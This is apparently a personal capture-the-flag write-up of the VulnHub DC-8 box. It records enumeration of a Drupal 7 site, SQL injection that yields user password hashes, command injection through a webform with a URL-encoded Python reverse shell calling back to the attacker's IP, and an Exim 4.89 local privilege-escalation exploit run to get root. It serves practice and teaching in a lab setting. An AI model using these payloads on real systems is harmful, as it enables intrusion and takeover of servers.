# BOX NAME: DC-8
**LINK**: https://www.vulnhub.com/entry/dc-8,367/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate the site, try some different drupalgeddons. Nothing. 
2. Find "http://dc-8/?nid=1"and sqlmap. 
3. Log in as user with gathered credentials.
4. Tamper with the mail form to get command-injection.
5. Get reverse shell. Exploit exim4 version with netcat version and get root-flag

So this box took me a while to compromise. Both to get into the web app, and to actually get a root shell. The Exim4 version didn't
strike me until i'd done all else..
The fact that the homepage, until clicked, was sql-injectable passed me by.

anywho, sooner I later, i'll get the goods.
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.70
[+] URL:	http://dc-8
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ jml-scanner -u 10.77.0.70                

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|J|M|L|-|P|O|R|T|S|C|A|N|N|E|R|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

[+] Port 22 is open.
[+] Port 80 is open.

[+] A total of 2 found ports open       
```
```
└─$ nmap -sV -sC $IP -oN nmap-dc8.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 12:46 CEST
Nmap scan report for dc.local (10.77.0.70)
Host is up (0.00020s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 35a7e6c4a83c631de1c0caa366bc88bf (RSA)
|   256 abef9f69acea54c68c6155490ae7aad9 (ECDSA)
|_  256 7ab2c687ec9376d4ea594b1bc6e873f2 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to DC-8 | DC-8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.85 seconds

```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
└─$ whatweb $URL --log-verbose=whatweb-dc8.log                                               
http://dc-8/ [200 OK] Apache
 Content-Language[en]
 Country[RESERVED][ZZ]
 Drupal
 HTTPServer[Apache]
 IP[10.77.0.70]
 JQuery
 MetaGenerator[Drupal 7 (http://drupal.org)]
 Script[text/javascript]
 Title[Welcome to DC-8 | DC-8]
 UncommonHeaders
 [x-content-type-options x-generatorlink]
 X-Frame-Options[SAMEORIGIN]
```

nikto-scan
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.70
+ Target Hostname:    dc-8
+ Target Port:        80
+ Start Time:         2023-05-04 12:46:41 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache
+ /: Drupal 7 was identified via the x-generator header. See: https://www.drupal.org/project/remove_http_headers
+ /: Drupal Link header found with value: </node/1>; rel="canonical",</node/1>; rel="shortlink". See: https://www.drupal.org/
+ /F2HxY7gm.php~: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /robots.txt: Entry '/?q=user/login/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/?q=filter/tips/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/INSTALL.sqlite.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/INSTALL.mysql.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/xmlrpc.php' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/user/password/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/user/login/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/UPGRADE.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/INSTALL.pgsql.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/filter/tips/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/install.php' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/LICENSE.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/MAINTAINERS.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/?q=user/password/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 68 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /: A database error may reveal internal details about the running database.
+ /web.config: ASP config file is accessible.
+ /user/: This might be interesting.
+ /UPGRADE.txt: Default file found.
+ /install.php: Drupal install.php file found. See: https://drupal.stackexchange.com/questions/269076/how-do-i-restrict-access-to-the-install-php-filehttps://drupal.stackexchange.com/questions/269076/how-do-i-restrict-access-to-the-install-php-file
+ /install.php: install.php file found.
+ /LICENSE.txt: License file found may identify site software.
+ /xmlrpc.php: xmlrpc.php was found.
+ /INSTALL.mysql.txt: Drupal installation file found. See: https://drupal.stackexchange.com/questions/269076/how-do-i-restrict-access-to-the-install-php-file
+ /INSTALL.pgsql.txt: Drupal installation file found. See: https://drupal.stackexchange.com/questions/269076/how-do-i-restrict-access-to-the-install-php-file
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8726 requests: 0 error(s) and 31 item(s) reported on remote host
+ End Time:           2023-05-04 12:47:51 (GMT2) (70 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing
```

```
other
```
 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  CMS Scan Results  [+] 

 ┏━Target: dc-8
 ┃
 ┠── CMS: Drupal
 ┃    │
 ┃    ├── Version: 7
 ┃    ╰── URL: https://drupal.org
 ┃
 ┠── Result: /home/jockemedlinux/GIT/writeups/VulnHUB/dc8/Result/dc-8/cms.json
 ┃
 ┗━Scan Completed in 0.24 Seconds, using 1 Requests

```
```
└─$ ~/tools/droopescan/droopescan scan drupal -u http://dc-8 
[+] Plugins found:                                                              
    ctools http://dc-8/sites/all/modules/ctools/
        http://dc-8/sites/all/modules/ctools/LICENSE.txt
        http://dc-8/sites/all/modules/ctools/API.txt
    views http://dc-8/sites/all/modules/views/
        http://dc-8/sites/all/modules/views/README.txt
        http://dc-8/sites/all/modules/views/LICENSE.txt
    webform http://dc-8/sites/all/modules/webform/
        http://dc-8/sites/all/modules/webform/README.md
        http://dc-8/sites/all/modules/webform/LICENSE.txt
    ckeditor http://dc-8/sites/all/modules/ckeditor/
        http://dc-8/sites/all/modules/ckeditor/CHANGELOG.txt
        http://dc-8/sites/all/modules/ckeditor/README.txt
        http://dc-8/sites/all/modules/ckeditor/LICENSE.txt
    better_formats http://dc-8/sites/all/modules/better_formats/
        http://dc-8/sites/all/modules/better_formats/README.txt
        http://dc-8/sites/all/modules/better_formats/LICENSE.txt
    profile http://dc-8/modules/profile/
    php http://dc-8/modules/php/			<--- INTERESTNG
    image http://dc-8/modules/image/

[+] Themes found:
    seven http://dc-8/themes/seven/                                                                                                                                                                                                                                          
    garland http://dc-8/themes/garland/                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                             
[+] Possible version(s):
    7.67

[+] Possible interesting urls found:
    Default changelog file - http://dc-8/CHANGELOG.txt
    Default admin - http://dc-8/user/login

[+] Scan finished (0:00:25.918443 elapsed)

```

</details>

</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1. SqlInjection to grab credentials. Droopescan reveals PHP is available. Guessing somewhere I'm able to inject php.
2. Get reverse shell after CMD-Injection at:
dc-8/node/3/done?sid=1459&cmd=%2Fusr%2Fbin%2Fpython%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.77.0.35%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27
3. Start local enum.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
4.0K drwxr-s---  2 Debian-exim adm  4.0K Sep  5  2019 exim4
```

**SUID's**:

```
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/sbin/exim4
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/ping
/bin/su
/bin/umount
/bin/mount
```
**SGID's**:

```
/usr/bin/wall
/usr/bin/expiry
/usr/bin/bsd-write
/usr/bin/ssh-agent
/usr/bin/crontab
/usr/bin/chage
/usr/bin/dotlockfile
/sbin/unix_chkpwd
```
**OTHERS**:

```
[+] 10.77.0.70 - exploit/linux/local/bpf_sign_extension_priv_esc: The target appears to be vulnerable.                                                                                                                                      
[+] 10.77.0.70 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.                                                                                                                                        
[+] 10.77.0.70 - exploit/linux/local/exim4_deliver_message_priv_esc: The target appears to be vulnerable.
```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```
/bin/bash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4be0cc32aba02ec4e0f010047be5ae9dee756960, stripped
 

No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 9.1 (stretch)
Release:        9.1
Codename:       stretch


Linux dc-8 4.9.0-4-amd64 #1 SMP Debian 4.9.51-1 (2017-09-28) x86_64 GNU/Linux
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```
+-----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+-----------------------+---------+---------------------------------------------------------+------------+---------+------------+--------+------------+---------+--------------------+-----------+------------+------------------+
| uid | data                                                                                                                                                                        | init                | mail                  | name    | pass                                                    | login      | theme   | access     | status | created    | picture | timezone           | signature | language   | signature_format |
+-----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+-----------------------+---------+---------------------------------------------------------+------------+---------+------------+--------+------------+---------+--------------------+-----------+------------+------------------+
| 0   | NULL                                                                                                                                                                        | <blank>             | <blank>               | <blank> | <blank>                                                 | 0          | <blank> | 0          | 0      | 0          | 0       | NULL               | <blank>   | <blank>    | NULL             |
| 1   | a:2:{s:7:"contact";i:0;s:7:"overlay";i:1;}                                                                                                                                  | dc8blah@dc8blah.org | dcau-user@outlook.com | admin   | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z | 1567766626 | <blank> | 1567766818 | 1      | 1567489015 | 0       | Australia/Brisbane | <blank>   | <blank>    | filtered_html    |
| 2   | a:5:{s:16:"ckeditor_default";s:1:"t";s:20:"ckeditor_show_toggle";s:1:"t";s:14:"ckeditor_width";s:4:"100%";s:13:"ckeditor_lang";s:2:"en";s:18:"ckeditor_auto_lang";s:1:"t";} | john@blahsdfsfd.org | john@blahsdfsfd.org   | john    | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF | 1567497783 | <blank> | 1567498512 | 1      | 1567489250 | 0       | Australia/Brisbane | <blank>   | <blank>    | filtered_html    |
+-----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+-----------------------+---------+---------------------------------------------------------+------------+---------+------------+--------+------------+---------+--------------------+-----------+------------+------------------+
```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
Exim 4.87 - 4.91 - Local Privilege Escalation                                                                                                                                                             | linux/local/46996.sh
./exim4 -m netcat

www-data@dc-8:/tmp$ ./exim4.sh -m netcat

raptor_exim_wiz - "The Return of the WIZard" LPE exploit
Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>

Delivering netcat payload...
220 dc-8 ESMTP Exim 4.89 Thu, 04 May 2023 21:50:37 +1000
250 dc-8 Hello localhost [::1]
250 OK
250 Accepted
354 Enter message, ending with "." on a line by itself
250 OK id=1puXTp-0005OW-IL
221 dc-8 closing connection

Waiting 5 seconds...
localhost [127.0.0.1] 31337 (?) open
id
uid=0(root) gid=113(Debian-exim) groups=113(Debian-exim)

```

```
Brilliant - you have succeeded!!!



888       888          888 888      8888888b.                             888 888 888 888
888   o   888          888 888      888  "Y88b                            888 888 888 888
888  d8b  888          888 888      888    888                            888 888 888 888
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888



Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

I'm also sending out an especially big thanks to:

@4nqr34z
@D4mianWayne
@0xmzfr
@theart42

This challenge was largely based on two things:

1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.
2. A suggestion from @theart42

The answer to that question is...

If you enjoyed this CTF, send me a tweet via @DCAU7.

```

```

```

</details>